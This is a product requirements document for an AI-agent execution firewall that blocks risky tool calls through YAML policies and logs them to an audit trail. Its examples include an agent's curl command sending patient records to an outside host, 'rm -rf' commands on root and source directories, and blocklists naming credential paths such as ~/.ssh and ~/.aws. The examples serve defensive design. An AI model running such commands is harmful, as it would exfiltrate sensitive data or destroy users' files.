# 🦞 SAFETYCLAWZ

## The Execution Firewall for Autonomous Agents

---

# 1. Executive Summary

SafetyClawz is an open-source execution firewall that sits between an autonomous agent and the real world.

It intercepts tool calls, evaluates risk, enforces policy, and issues a decision before execution occurs.

Agents can reason freely.

But they cannot act without passing through SafetyClawz.

---

# 2. Problem

Modern agents can:

* Send emails
* Execute shell commands
* Modify databases
* Call external APIs
* Access credentials
* Trigger workflows
* Automate browsers

Current frameworks optimize for orchestration, not execution governance.

There is no standard execution firewall for autonomous systems.

Without one, agents operate with implicit trust.

That does not scale to production or enterprise environments.

---

# 3. User Journeys

User journeys anchor all requirements to real-world use cases. Each journey maps to specific functional and non-functional requirements documented later in this PRD.

## Journey Format

Each journey follows this structure:
- **Actor**: User persona and role
- **Context**: Domain and constraints
- **Current Pain**: Problem being solved
- **Desired Outcome**: Success state
- **Journey Steps**: Concrete workflow
- **Success Metrics**: Measurable outcomes
- **Derived Requirements**: Traceable to FR/NFR sections

---

## UJ-001: OpenClaw Developer - Unified Tool Governance

**Actor**: Jake, OpenClaw developer maintaining custom approval logic

**Context**: Manages autonomous agent with multiple tool types (exec, file operations, browser automation, channel messaging). OpenClaw provides tool allowlists and sandboxing, but **no execution approval workflow** for high-risk operations. Security documentation warns of prompt injection attacks like "Find the Truth" that manipulate agents into filesystem exploration, but only manual security controls exist.

**Current Pain**: 
- 500+ lines of custom approval logic spread across tool handlers
- Inconsistent enforcement (exec has allowlists, but file writes not checked)
- Policy changes require code deployment and restart
- No centralized audit trail across tool types
- Hard to maintain as tool count grows
- Community reports real incidents: "The `find ~` incident" where agent dumped entire home directory to group chat

**Desired Outcome**: Single policy configuration governs all tool types with consistent enforcement and centralized audit logging.

**Journey Steps**:
1. Jake installs SafetyClawz as OpenClaw dependency: `npm install safetyclawz`
2. Jake creates policy file `safety-policy.yaml` with unified rules
3. Jake wraps OpenClaw tools with SafetyClawz evaluation middleware
4. Agent attempts high-risk exec command → SafetyClawz blocks per policy
5. Jake reviews audit log showing consistent enforcement across all tool types
6. Jake updates policy via YAML edit (no code change required)

**Success Metrics**:
- Approval code reduced from 500 lines to 50-line YAML configuration (90% reduction)
- Policy changes deployable without code restart
- 100% of tool invocations logged with decision rationale
- Zero tool types bypass evaluation

**Derived Requirements**: FR-POL-001, FR-POL-002, FR-INT-001, FR-AUDIT-001, NFR-DX-001

---

## UJ-002: Enterprise Compliance Officer - Centralized Audit

**Actor**: Maria, Healthcare Enterprise Compliance Officer

**Context**: Audits autonomous agents accessing patient systems. HIPAA compliance requires complete audit trail of all data access and external communications.

**Current Pain**:
- Manual log correlation across multiple agent sessions
- No unified view of agent actions across deployment
- Cannot prove policy enforcement to auditors
- Incident investigation requires hours of log archaeology
- No real-time alerting on policy violations

**Desired Outcome**: Centralized audit dashboard showing all agent actions with decision rationale, filterable by risk level, agent, and time range.

**Journey Steps**:
1. Maria configures SafetyClawz with HIPAA-specific policy rules (PHI classification)
2. SafetyClawz deploys across all production agents
3. Agent attempts: `exec curl -X POST https://external.com/upload --data @patient-records.csv`
4. SafetyClawz evaluates: external communication + PHI data → Risk Score 0.92 → BLOCK
5. Maria receives real-time alert: "Agent healthbot-01 attempted external PHI transfer (BLOCKED)"
6. Maria opens audit dashboard, filters by "BLOCKED + PHI", exports compliance report

**Success Metrics**:
- 100% of high-risk actions logged with decision rationale
- Audit queries return results within 200ms for 10K entry datasets
- Zero compliance violations due to unenforced policy
- Compliance reports generated in under 5 seconds

**Derived Requirements**: FR-AUDIT-001, FR-AUDIT-002, FR-ALERT-001, NFR-AUDIT-QUERY-001, DOMAIN-HIPAA-001

---

## UJ-003: Solo Developer - Prevent Accidental Actions

**Actor**: Alex, Solo Indie Developer

**Context**: Uses AI agents (including OpenClaw) to accelerate development workflow, working rapidly across multiple projects. Occasionally miscommunicates intent or agent misinterprets instructions.

**Current Pain**:
- **Real OpenClaw incident**: User asked agent "show me my home directory" - agent ran `find ~` and dumped entire directory tree (including sensitive paths like `.ssh/`, `.aws/`, private repos) to group chat
- Agent misunderstood "clean up test files" and executed `rm -rf src/tests/*` instead of `rm -rf test-output/*`
- Lost 3 hours of work (tests not in git)
- Accidental email sends to wrong recipients during automation testing
- No safety net between intent and execution for high-risk operations
- Fear of using agent for destructive operations limits productivity

**Desired Outcome**: Destructive operations always get sanity check before execution, while low-risk operations flow smoothly without interruption.

**Journey Steps (V1 - Blocklist Protection)**:
1. Alex configures SafetyClawz with default safety policy (install via `npm install -g safetyclawz; safetyclawz init`)
2. Agent proposes: `exec rm -rf src/tests/`
3. SafetyClawz evaluates: `src/` matches blocked source directory patterns → BLOCK
4. Alex receives: "Command blocked: 'rm -rf' on source directory src/ violates policy"
5. Alex clarifies: "Delete test-output directory only"
6. Agent proposes: `exec rm -rf test-output/`
7. SafetyClawz evaluates: `test-output/` not in blocklist, `rm` in allowed commands → ALLOW
8. Command executes successfully

**Journey Steps (Growth - Risk Scoring + Approval)**:
1. Alex enables Growth features: risk scoring + REQUIRE_APPROVAL state
2. Agent proposes: `exec rm -rf src/tests/`
3. SafetyClawz evaluates: file deletion + recursive + source directory → Risk Score 0.85 → HIGH
4. Decision: REQUIRE_APPROVAL
5. Alex sees notification: "About to delete 47 files recursively in src/tests/ - APPROVE or DENY?"
6. Alex recognizes mistake (wrong path), denies
7. Agent proposes: `exec rm -rf test-output/`
8. SafetyClawz evaluates: build artifact directory → Risk Score 0.35 → LOW → APPROVE (auto-execute)

**Success Metrics (V1)**:
- 80% reduction in accidental destructive operations via blocklist enforcement
- Allowlisted operations (git, npm, safe file ops) execute without friction
- Zero false positives for explicitly allowlisted commands
- Blocklist prevents all `rm -rf` on sensitive paths (`/`, `/etc`, `~/.ssh`, source directories)

**Success Metrics (Growth)**:
- 95% reduction in accidental destructive operations with risk scoring
- Approval requests average under 3 per hour during normal development
- Risk scoring enables granular control beyond blocklists

**Derived Requirements (V1)**: FR-POL-001, FR-DECISION-001 (ALLOW/BLOCK only), NFR-UX-001  
**Derived Requirements (Growth)**: FR-RISK-001, FR-RISK-002, FR-DECISION-001 (full 4-state)

---

## User Journey Coverage Matrix

| Tool Category | UJ-001 | UJ-002 | UJ-003 | Covered |
|---------------|--------|--------|--------|---------|------|
| Shell Execution | ✓ | ✓ | ✓ | ✓ |
| File Operations | ✓ | | ✓ | ✓ |
| External Communication | ✓ | ✓ | | ✓ |
| Messaging/Email | ✓ | | ✓ | ✓ |
| Database Operations | ✓ | ✓ | | ✓ |
| Credential Access | | ✓ | | ✓ |
| Browser Automation | ✓ | | | ✓ |

---

# 4. Success Criteria

SafetyClawz success is measured across three achievement tiers, balancing realistic goals with ambitious vision.

## 4.1 Minimum Viable Success (6 months post-V1)

These metrics define the floor for product-market fit validation.

**Adoption:**
- **200+ active OpenClaw integrations** - Measured via npm dependents, community surveys
- **1,000+ GitHub stars** - Measured via GitHub analytics
- **90%+ coverage of top 10 OpenClaw tool types** - Measured via integration test suite (exec, file, browser, messaging, database, etc.)

**Technical Performance:**
- **P95 latency <200ms** - Risk evaluation completes within 200ms for 95% of requests (instrumented load tests)
- **P99 latency <500ms** - 99th percentile under 500ms (production telemetry)
- **99.9% evaluation reliability** - Successful evaluation (local mode) with graceful fail-closed on errors

**Developer Experience:**
- **<10 minutes to first protection** - New user completes installation and first evaluation within 10 minutes (onboarding instrumentation)
- **Minimal integration code** - OpenClaw wrapper requires <30 lines (example validation)

**Safety Impact (V1 Scope Only):**
- **85%+ dangerous action prevention rate** - Block 85%+ of dangerous actions based on audit log analysis
- **V1 dangerous actions**: Commands not in allowlist, paths in blocklist, rate limit exceeded, unauthorized contacts/channels
- **V1 decisions**: ALLOW (meets policy) or BLOCK (violates policy) - NO risk scoring, NO approval prompts in V1
- **Example blocks**: `rm -rf /` (path blocklist), `imsg send` to unapproved contact (allowlist), 11th message/hour (rate limit)
- **Growth phase adds**: Risk score >0.7 threshold, REQUIRE_APPROVAL/SIMULATE states, heuristic scoring

## 4.2 Strong Success (12 months post-V1)

These metrics indicate market traction and sustainable growth.

**Adoption:**
- **500+ active integrations across 2+ agent runtimes** - OpenClaw + at least one other framework (LangGraph, OpenAI Agents, etc.)
- **3,000+ GitHub stars, 30+ contributors** - Healthy open-source community indicators
- **SafetyClawz mentioned in 3+ blog posts/talks** - Community shares solutions to agent safety incidents

**Ecosystem:**
- **Community policy library with 5+ templates** - HIPAA, development safety, production guardrails, etc. (GitHub PR count)
- **At least 1 enterprise pilot (100+ employees)** - Production deployment in regulated environment (case study or announcement)

**Technical & DX:**
- **<5% false positive complaints** - Approval requests reported as unnecessary represent <5% of user feedback (GitHub issues, surveys)
- **85% policy authoring success rate** - Users successfully create custom policy on first attempt (tutorial completion analytics)
- **99.99% audit log durability** - Append-only logs maintain integrity under normal operation with crash recovery (validation suite)

**Safety Impact:**
- **90%+ high-risk prevention rate** - Consistent enforcement across production deployments
- **Zero reported compliance failures** - No incidents where SafetyClawz failed to enforce policy in enterprise deployments

## 4.3 Breakout Success (18-24 months post-V1)

These metrics represent category leadership and ecosystem dominance.

**Market Leadership:**
- **2,000+ integrations across 5+ agent runtimes** - De facto standard for agent execution governance
- **10,000+ GitHub stars** - Top-tier open-source security project recognition
- **5+ enterprise customers in production** - Validated enterprise business model

**Ecosystem & Validation:**
- **Independent security audit published** - Third-party security researcher or firm publishes analysis (public report, paper, or talk)
- **10+ community policy templates** - Thriving policy sharing ecosystem
- **Academic or conference mentions** - Cited in security research papers or featured in industry conferences

**Technical Excellence:**
- **3+ language SDKs** - Python, JavaScript/TypeScript, Go (or similar)
- **Integration marketplace** - Documented integrations with major agent frameworks
- **Signed audit receipts** - Cryptographic verification for compliance use cases

**Market Impact:**
- **"SafetyClawz" becomes verb** - "Did you SafetyClawz your agent?" enters developer vocabulary
- **Framework adoption** - Major agent frameworks (LangChain, AutoGPT successors) recommend or bundle SafetyClawz

---

## Success Criteria Measurement

**Data Sources:**
- GitHub analytics (stars, contributors, dependents)
- npm download statistics
- Opt-in production telemetry (privacy-preserving)
- User surveys and feedback
- Community tracking (blog posts, Reddit, Discord mentions)
- Customer interviews and case studies

**Review Cadence:**
- Monthly: Technical performance metrics (latency, reliability)
- Quarterly: Adoption and ecosystem metrics
- Annually: Strategic positioning and market impact

---

# 5. Product Scope

SafetyClawz development is organized into three phases: MVP (V1), Growth (V2-V3), and Vision. Each phase builds on the previous, with clear boundaries defining what ships when and why.

## 5.1 MVP - Minimum Viable Product (V1: Months 1-6)

**Goal**: Ship fast, solve simple problems users have TODAY. Start with **allowlist wrapper + audit logging**, defer complex risk scoring to Growth.

**Target Achievement**: Minimum Viable Success criteria (200+ integrations, <200ms latency, 85% prevention rate)

**Core Philosophy**: Build **thin, opinionated wrapper** around proven patterns (OpenClaw allowlists, rate limits) with **unified YAML config** and **audit trail**. Prove value with **simplest possible safeguards** before adding complexity.

**V1 Implementation**: OpenClaw plugin using `before_tool_call` and `after_tool_call` hooks to intercept and enforce YAML policies on ALL tool invocations.

### Simple Safeguards (80% of UJ-003 Solo Developer needs)

**Allowlist-Based Protection** (wraps OpenClaw's existing allowlist logic):
- **Exec tool allowlists**: Safe command patterns (`git`, `npm`, `ls` allowed; `rm -rf /` blocked)
- **Contact allowlists**: Approved messaging recipients (prevent spam to entire contact list)
- **Path blocklists**: Sensitive directories (`/`, `/etc`, `/usr`, `~/.ssh`) off-limits
- **Rate limiting**: Per-tool throttling (max 10 messages/hour prevents contact list spam)

**Unified YAML Policy** (differentiator from scattered code):
```yaml
# One config file governs ALL tool types
safeguards:
  messaging:
    rate_limit: 10/hour
    allowed_contacts: ["+1234567890", "team@company.com"]
  
  exec:
    mode: allowlist  # Wraps OpenClaw's allowlist mode
    allowed_commands: ["git", "npm", "pnpm", "ls", "cat", "grep"]
    blocked_paths: ["/", "/etc", "/usr", "~/.ssh", "~/.aws"]
  
  files:
    read_only_paths: ["/var", "/tmp"]
    write_blocked_extensions: [".key", ".pem", ".env"]
```

**Audit Logging** (OpenClaw doesn't have this):
- Append-only JSONL: `{timestamp, tool, action, decision, reason}`
- Simple queries: `safetyclawz audit --blocked --last-24h`
- No complex risk scores in V1—just "allowed per policy" or "blocked (rate limit)" or "blocked (not in allowlist)"

### Integration & Tooling

**Must Include:**
- **OpenClaw plugin** - Installs via `npm install -g safetyclawz`, configured in `~/.openclaw/config.json`, uses `before_tool_call` hook for enforcement
- **Python SDK** - Thin wrapper library for LangGraph/CrewAI/AutoGen (`pip install safetyclawz`) 
- **CLI tool** - `safetyclawz init` (generates sensible default policy), `safetyclawz audit` (query logs)
- **Policy validator** - `safetyclawz validate policy.yaml` (syntax check before deployment)

**Security Framework**: SafetyClawz aligns with **MITRE ATLAS** (Adversarial Threat Landscape for Artificial-Intelligence Systems), the industry-standard knowledge base for AI/ML security threats. It adds runtime enforcement to OpenClaw's Trust Boundary 3 (Tool Execution), using OpenClaw's production-validated security knowledge (dangerous-tools.ts, skill-scanner.ts) as policy defaults.

**Technical Architecture**:
```typescript
// SafetyClawz plugin (src/index.ts)
export default function (api) {
  const policy = loadPolicy('~/.safetyclawz/policy.yaml');
  
  // Intercept BEFORE tool execution
  api.registerHook('before_tool_call', async (event, ctx) => {
    const decision = await evaluatePolicy({ 
      toolName: event.toolName, 
      params: event.params, 
      policy 
    });
    
    if (decision.action === 'BLOCK') {
      return { block: true, blockReason: decision.reason };
    }
  });
  
  // Log AFTER tool execution  
  api.registerHook('after_tool_call', async (event, ctx) => {
    auditLog.write({ 
      toolName: event.toolName, 
      result: event.result, 
      durationMs: event.durationMs 
    });
  });
}
```

### Documentation

**Must Include:**
- **Quick Start**: 5-minute "prevent contact spam" tutorial
- **OpenClaw integration**: Code example wrapping messaging/exec tools
- **Policy cookbook**: Common patterns (spam prevention, safe exec, path protection)
- **Real incident examples**: How SafetyClawz prevents "find ~" dumping `/Users/dev/.ssh` to chat

**Why This Wins**:
- ✅ **Ships in weeks** (wraps existing allowlist code, no risk engine to build)
- ✅ **Solves real pain** (80% of UJ-003: prevent spam, prevent `rm -rf` accidents)
- ✅ **Unified config** (YAML governs all tools, not scattered in code)
- ✅ **Audit trail** (logs what OpenClaw doesn't log)
- ✅ **Foundation for Growth** (allowlist → risk scoring is natural progression)

### Out of Scope (V1) — Deferred to Growth Phase

**Explicitly NOT Included:**
- ❌ **Risk scoring engine** (V1 uses simple allow/block rules only)
- ❌ **REQUIRE_APPROVAL decision** (V1 only ALLOW or BLOCK silently per policy)
- ❌ **Approval prompts/UI** (no human-in-loop, just enforce policy)
- ❌ **Pluggable risk scorers** (Growth adds this)
- ❌ **SIMULATE mode** (Growth adds dry-run capability)
- ❌ **Policy libraries** (users write own policies in V1)
- ❌ **Compliance exports** (CSV/PDF reports deferred)
- ❌ **Signed receipts** (cryptographic audit trail deferred)
- ❌ **Multi-language SDKs** (Python only)
- ❌ **SaaS offering** (local/embedded only)
- ❌ **Enterprise SSO/RBAC** (single-user focus)
- ❌ **Robotics/hardware** (software tools only)

**Rationale**: **Start with 20% of features that solve 80% of problems.** V1 proves: "Unified YAML policy + audit logging is valuable even without complex risk engine." Growth phase adds sophistication once users validate simple version.

---

## 5.2 Growth Phase (V2-V3: Months 7-18)

**Goal**: Add sophistication once MVP proves simple allowlist wrapper has value. Target enterprise users (UJ-002) and power users wanting risk-based workflows.

**Prerequisites**: MVP shipped, Minimum Viable Success achieved (200+ integrations), community feedback shows demand for advanced features.

### Risk Scoring Engine (Deferred from V1)

**Now Include:**
- **Heuristic risk scorer** - Weighted formula: `0.30×external + 0.20×sensitive_tool + 0.20×(1-confidence) + 0.15×chain_depth + 0.15×data_classification`
- **Risk-based decisions** - APPROVE / **REQUIRE_APPROVAL** / SIMULATE / BLOCK (adds human-in-loop)
- **Approval workflows** - Interactive prompts: "About to delete 47 files recursively in src/tests/ — APPROVE or DENY?"
- **SIMULATE mode** - Dry-run capability (describe impact without executing)
- **Pluggable risk scorers** - Architecture supporting custom scoring logic (ML models, external services)

**Why Growth Not MVP**: Risk scoring adds complexity. Prove simple allowlists work first, then add sophistication.

### Enhanced Policy & Compliance

**Should Include:**
- **Policy template library** - Pre-built templates (HIPAA baseline, PCI-DSS baseline, SOC2 baseline)
- **Compliance exports** - CSV/PDF reports for auditors (HIPAA 6-year retention formatted)
- **Signed cryptographic receipts** - Hash-chained audit logs with Ed25519 signatures
- **Policy versioning** - Track changes, rollback capability (`safetyclawz policy rollback --version abc123`)
- **Policy testing framework** - Validate policies against test scenarios before deployment

### Additional Runtime Integrations

**Should Include:**
- **LangGraph adapter** - Integration with LangChain's agent framework
- **OpenAI Agents adapter** - Support for OpenAI's agent runtime (if released)
- **Generic agent wrapper** - Template for integrating any Python agent framework
- **JavaScript/TypeScript SDK** - Enable Node.js agent integrations

### Enterprise & Compliance

**Should Include:**
- **Audit query interface** - Filter, search, and export audit logs (supports UJ-002 compliance use case)
- **Signed audit receipts** - Cryptographic verification for tamper-proof compliance records
- **Compliance report generator** - Pre-built templates for HIPAA, SOC2, ISO 27001 audits
- **Alert/notification system** - Real-time alerts on high-risk blocks (supports UJ-002)

### Developer Experience

**Should Include:**
- **WebSocket/API mode** - Remote evaluation service for distributed deployments
- **Policy validation CLI** - `safetyclawz policy validate` catches errors before deployment
- **Integration testing helpers** - Mock evaluation framework for agent development
- **Performance profiling** - Identify slow risk evaluations in production

**Rationale**: Growth phase focuses on ecosystem expansion and enterprise validation. Features support scaling from individual developers (UJ-003) to teams (UJ-001) to enterprises (UJ-002).

---

## 5.3 Vision Phase (Future: Months 18+)

**Goal**: Category leadership, Breakout Success criteria (2,000+ integrations, 10K stars, 5+ enterprise customers, academic validation).

**Prerequisites**: Growth phase complete, Strong Success achieved, enterprise revenue model validated.

### Advanced Capabilities

**Could Include:**
- **ML-based anomaly detection** - Learn normal agent behavior patterns, flag deviations
- **Behavioral risk analysis** - Consider agent history and context beyond single action
- **Multi-agent governance** - Coordinate policies across related agents
- **Natural language policy authoring** - "Block any external communication with PHI" → YAML generation
- **Risk explanation engine** - Generate human-readable justifications for decisions

### Physical Safety Systems

**Could Include:**
- **Robotics safety adapter** - Real-time latency requirements (<50ms), spatial validation, workspace boundaries (resurrect deferred UJ-003)
- **Hardware actuation policies** - Tool-specific rules for physical systems
- **Preview/visualization hooks** - 3D workspace visualization for approval workflows
- **Emergency stop integration** - Fail-safe coordination with hardware e-stops

### Platform & Scale

**Could Include:**
- **Multi-language SDKs** - Go, Rust, Java implementations
- **SaaS offering** - Centralized policy management, fleet-wide governance
- **Enterprise SSO/RBAC** - Integration with Okta, Azure AD, role-based policy enforcement
- **Community governance framework** - Open policy standards body, certification program
- **Academic partnerships** - Research collaborations on AI safety

### Ecosystem

**Could Include:**
- **Policy marketplace** - Verified, paid policy templates for specialized industries
- **Security researcher program** - Bug bounty, responsible disclosure framework
- **Integration marketplace** - Third-party adapters and extensions
- **Training/certification** - SafetyClawz policy authoring certification

**Rationale**: Vision phase represents long-term market leadership. Features are speculative, requiring substantial validation and investment. Physical safety systems only pursued with customer demand and domain expertise.

---

## 5.4 Scope Decision Framework

**How we decide what phase a feature belongs in:**

**MVP if:**
- Solves core user journey pain (UJ-001, UJ-003)
- Architecturally foundational (can't add later without breaking changes)
- Required for Minimum Viable Success criteria
- Low complexity, high impact

**Growth if:**
- Expands to additional user journeys (new personas added)
- Builds on MVP foundation (requires V1 to exist)
- Required for Strong Success criteria
- Needs market validation before major investment

**Vision if:**
- Speculative market demand (no validated user requests yet)
- Requires significant R&D investment
- Targets Breakout Success criteria
- Could be built by third-party ecosystem instead

---

# 6. Functional Requirements

All functional requirements are derived from user journeys (Section 3) and mapped to MVP/Growth/Vision phases (Section 5).

## 6.1 Policy Management

### FR-POL-001: YAML-Based Policy Configuration
**Priority**: Must Have (MVP)  
**Source**: UJ-001 (OpenClaw Developer)

**Description**: System must support human-readable YAML policy files defining **simple safeguards** (allowlists, rate limits, path restrictions).

**V1 Scope (Simple Policies)**:
- Policy files use `.yaml` or `.yml` extension
- **Simple rule types**: allowlists, blocklists, rate limits (no complex conditional logic in V1)
- **Simple variables**: `tool`, `contact`, `path`, `command` (no `risk_score` in V1—deferred to Growth)
- **Simple actions**: `ALLOW` or `BLOCK` (no `REQUIRE_APPROVAL` or `SIMULATE` in V1—deferred to Growth)
- Policy syntax errors produce clear error messages with line numbers
- Policy changes hot-reloadable without system restart

**Growth Phase Addition**: Add conditional logic (AND/OR operators), risk_score variable, REQUIRE_APPROVAL/SIMULATE actions

**Test Cases (V1 Simple Format)**:
```yaml
# Example V1 policy (simple allowlists + rate limits)
safeguards:
  messaging:
    rate_limit: 10/hour
    allowed_contacts: ["+1234567890", "team@company.com"]
    # Any contact not in list → BLOCK
  
  exec:
    allowed_commands: ["git", "npm", "ls"]
    blocked_paths: ["/", "/etc", "~/.ssh"]
    # Command not in allowed list → BLOCK
    # Path in blocked list → BLOCK
```

**Growth Phase Example (Complex Conditional Logic)**:
```yaml
# Growth phase: risk-based conditional rules
rules:
  - name: forbid_external_phi_transfer
    condition: external_communication == true AND data_classification == "PHI"
    action: BLOCK
  
  - name: require_approval_for_high_risk
    condition: risk_score > 0.7
    action: REQUIRE_APPROVAL
```

---

### FR-POL-002: Policy Rule Priority
**Priority**: Must Have (MVP)  
**Source**: UJ-001

**Description**: When multiple policy rules match an action request, system must apply rules in defined priority order.

**Acceptance Criteria**:
- Rules evaluated top-to-bottom in YAML file order
- First matching rule determines decision
- If no rules match, default policy applies (configurable: APPROVE or REQUIRE_APPROVAL)
- Rule evaluation order must be deterministic and documented

---

### FR-POL-003: Policy Library (Growth)
**Priority**: Should Have (Growth Phase)  
**Source**: UJ-002 (Enterprise Compliance)

**Description**: System shall provide pre-built policy templates for common compliance frameworks (HIPAA, PCI-DSS, SOC2).

**Acceptance Criteria**:
- Library includes at minimum: HIPAA baseline, PCI-DSS baseline, SOC2 baseline
- Templates provided as YAML files with inline documentation
- Users can extend templates via inheritance or composition
- Policy library versioned and distributed via package manager

---

## 6.2 Risk Evaluation

### FR-RISK-001: Heuristic Risk Scoring
**Priority**: Should Have (Growth Phase) — **Deferred from V1**  
**Source**: UJ-003 (Solo Developer advanced scenarios)

**Description**: System must calculate risk scores (0.0–1.0) using weighted heuristic model based on measurable action characteristics.

**Acceptance Criteria**:
- Risk score formula: `0.30×external_comm + 0.20×sensitive_tool + 0.20×(1-confidence) + 0.15×chain_depth + 0.15×data_classification`
- Each factor normalized to 0.0–1.0 range
- Output includes: `risk_score` (float), `risk_level` (LOW/MEDIUM/HIGH/CRITICAL), `risk_factors` (array), `explanation` (string)
- Risk thresholds: LOW <0.3, MEDIUM 0.3–0.6, HIGH 0.6–0.8, CRITICAL >0.8
- Calculation must complete in <50ms (P95)

**Test Cases**:
```python
# High-risk: external PHI transfer
action = ActionRequest(
    tool="api.post",
    external_communication=True,
    data_classification="PHI",  # weight 1.0
    confidence=0.9,
    chain_depth=2
)
assert 0.7 <= calculate_risk(action) <= 0.9
assert risk_level == "HIGH" or risk_level == "CRITICAL"
```

---

### FR-RISK-002: Risk Explanation
**Priority**: Should Have (Growth Phase) — **Depends on FR-RISK-001**  
**Source**: UJ-003 (Growth phase)

**Description**: Every risk assessment must include human-readable explanation of factors contributing to risk score.

**Acceptance Criteria**:
- Explanation lists all non-zero risk factors
- Each factor shows its contribution (e.g., "External communication (+0.30)")
- Explanation identifies which thresholds were crossed
- Explanation language suitable for non-technical users

**Example Output**:
```
Risk Score: 0.85 (CRITICAL)
Factors:
  • External communication detected (+0.30)
  • Sensitive tool: db.delete (+0.20)
  • Low confidence score: 0.65 (+0.07)
  • Deep chain depth: 5 levels (+0.12)
  • PHI data classification (+0.15)
Reason: CRITICAL threshold (>0.8) exceeded
```

---

### FR-RISK-003: Pluggable Risk Scorers (Growth)
**Priority**: Should Have (Growth Phase)  
**Source**: UJ-002

**Description**: System shall support custom risk scoring algorithms via plugin interface.

**Acceptance Criteria**:
- Plugins implement `IRiskScorer` interface
- Multiple scorers can run in ensemble mode (weighted average)
- Default heuristic scorer always available as fallback
- Plugin errors must not crash evaluation (graceful degradation)

---

## 6.3 Decision Execution

### FR-DECISION-001: Decision Model
**Priority**: Must Have (MVP — simplified), Should Have (Growth — full model)  
**Source**: UJ-003

**Description**: System must support policy-based allow/block decisions.

**V1 Scope (Two-State Model)**:
- **ALLOW**: Execute action immediately, log execution
- **BLOCK**: Do NOT execute, return denial reason ("not in allowlist", "rate limit exceeded", "blocked path"), log block decision
- Decision must be deterministic given same action and policy
- Decision includes: `decision` (ALLOW|BLOCK), `reason` (string), `triggered_rule` (string or null)

**Growth Phase Addition (Four-State Model)**:
- **REQUIRE_APPROVAL**: Pause execution, request human approval, proceed based on response
- **SIMULATE**: Do NOT execute, return predicted outcome description, log simulation
- Risk-based decision logic (not just allowlist matching)

---

### FR-DECISION-002: Decision Justification
**Priority**: Must Have (MVP — simplified), Should Have (Growth — full explanations)  
**Source**: UJ-002

**Description**: Every decision must include which policy rule triggered it (if any) and why.

**V1 Acceptance Criteria**:
- If policy rule triggered: include rule name and matched condition (e.g., "blocked_paths: ~/.ssh")
- If allowlist/blocklist match: indicate which list and pattern matched
- If rate limit triggered: indicate limit value and current count
- Justification must be JSON-serializable for audit log
- Example: `{ "decision": "BLOCK", "reason": "Command 'sudo' not in allowed_commands", "triggered_rule": "exec.allowed_commands" }`

**Growth Acceptance Criteria (adds risk-based explanations)**:
- If risk-based decision: include risk score, threshold crossed, and contributing factors
- If default policy applied: indicate no rules matched but risk threshold exceeded
- Detailed factor breakdown (external communication +0.30, sensitive tool +0.20, etc.)

---

### FR-DECISION-003: Approval Workflow (Growth)
**Priority**: Should Have (Growth Phase)  
**Source**: UJ-002

**Description**: For REQUIRE_APPROVAL decisions, system shall support configurable approval workflows (synchronous prompt, async notification, multi-party approval).

**Acceptance Criteria**:
- V1: Synchronous CLI prompt (blocking)
- Growth: Webhook notification to external approval service
- Growth: Multi-party approval (2-of-3 approvers required)
- Timeout configuration (auto-BLOCK after X seconds)

---

## 6.4 Integration

### FR-INT-001: Runtime-Agnostic Tool Wrapper
**Priority**: Must Have (MVP)  
**Source**: UJ-001

**Description**: System must provide adapters to wrap tool execution in any agent runtime without modifying tool implementation.

**Acceptance Criteria**:
- V1 supports: OpenClaw (TypeScript/JavaScript)
- Wrapper intercepts tool call before execution
- Wrapper constructs ActionRequest from tool metadata
- Wrapper enforces decision (execute, block, simulate)
- Wrapper logs to audit trail
- Wrapper must not modify tool function signatures

**Example Integration**:
```typescript
// Before SafetyClawz
const result = await bashTool.exec("rm -rf /tmp/test");

// After SafetyClawz
const wrappedBashTool = safetyclawz.wrap(bashTool);
const result = await wrappedBashTool.exec("rm -rf /tmp/test");
// ^ Intercepted, evaluated, logged
```

---

### FR-INT-002: Multi-Runtime Support (Growth)
**Priority**: Should Have (Growth Phase)  
**Source**: Product Scope 5.2

**Description**: System shall support LangGraph, OpenAI Agents SDK, AutoGPT, and custom agent runtimes.

**Acceptance Criteria**:
- Each runtime has dedicated adapter package
- Adapters published to package managers (npm, PyPI)
- Integration documented with code examples
- Adapters share common core evaluation engine

---

### FR-INT-003: Middleware Mode
**Priority**: Should Have (MVP)  
**Source**: Product Scope 5.1

**Description**: System must support deployment as HTTP middleware for distributed agent architectures.

**Acceptance Criteria**:
- Exposes REST API: `POST /evaluate` accepts ActionRequest JSON, returns Decision JSON
- Supports WebSocket for streaming decisions
- Stateless design (policies and audit config external)
- Response time <200ms (P95) for evaluation endpoint

---

## 6.5 Audit & Logging

### FR-AUDIT-001: Append-Only Audit Trail
**Priority**: Must Have (MVP)  
**Source**: UJ-001, UJ-002

**Description**: System must log all evaluations to append-only, tamper-evident audit trail.

**Acceptance Criteria**:
- Each log entry is immutable after write
- Log format: JSONL (one JSON object per line)
- Each entry includes: `timestamp`, `session_id`, `agent_id`, `action_request`, `risk_assessment`, `decision`, `action_receipt` (if executed)
- Logs stored with atomic writes (no partial entries)
- File permissions prevent modification after write (OS-level)

**Log Entry Schema**:
```json
{
  "timestamp": "2026-02-16T10:23:45.123Z",
  "session_id": "sess_abc123",
  "agent_id": "openclaw_dev_001",
  "action_request": { /* ActionRequest object */ },
  "risk_assessment": { /* RiskAssessment object */ },
  "decision": { /* Decision object */ },
  "action_receipt": { /* execution result, if APPROVED */ }
}
```

---

### FR-AUDIT-002: Audit Query Interface
**Priority**: Must Have (MVP)  
**Source**: UJ-002

**Description**: System must provide programmatic API to query audit logs with filtering and pagination.

**Acceptance Criteria**:
- Query filters: `session_id`, `agent_id`, `decision`, `risk_level`, `time_range`, `tool_name`
- Supports boolean combinations (AND/OR)
- Pagination support (offset/limit or cursor-based)
- Query performance: <200ms for 10K entries (NFR-AUDIT-QUERY-001)
- Returns results in JSON format

---

### FR-AUDIT-003: Compliance Exports (Growth)
**Priority**: Should Have (Growth Phase)  
**Source**: UJ-002

**Description**: System shall generate compliance-ready audit reports in standard formats (CSV, PDF, SIEM-compatible JSON).

**Acceptance Criteria**:
- Export formats: CSV, JSON, PDF
- Reports include: summary statistics, decision breakdown, high-risk actions, policy violations
- PDF reports formatted for auditor review (human-readable)
- CSV/JSON exports compatible with SIEM tools (Splunk, ELK)

---

### FR-AUDIT-004: Signed Receipts (Growth)
**Priority**: Should Have (Growth Phase)  
**Source**: Product Scope 5.2

**Description**: System shall cryptographically sign audit log entries for non-repudiation.

**Acceptance Criteria**:
- Each log entry includes cryptographic signature
- Signature algorithm: Ed25519 or ECDSA
- Public key verification tool provided
- Hash-chained logs (each entry references hash of previous entry)

---

## 6.6 Alerting

### FR-ALERT-001: Real-Time Policy Violation Alerts
**Priority**: Should Have (Growth Phase)  
**Source**: UJ-002

**Description**: System shall send real-time notifications when high-risk actions are blocked or require approval.

**Acceptance Criteria**:
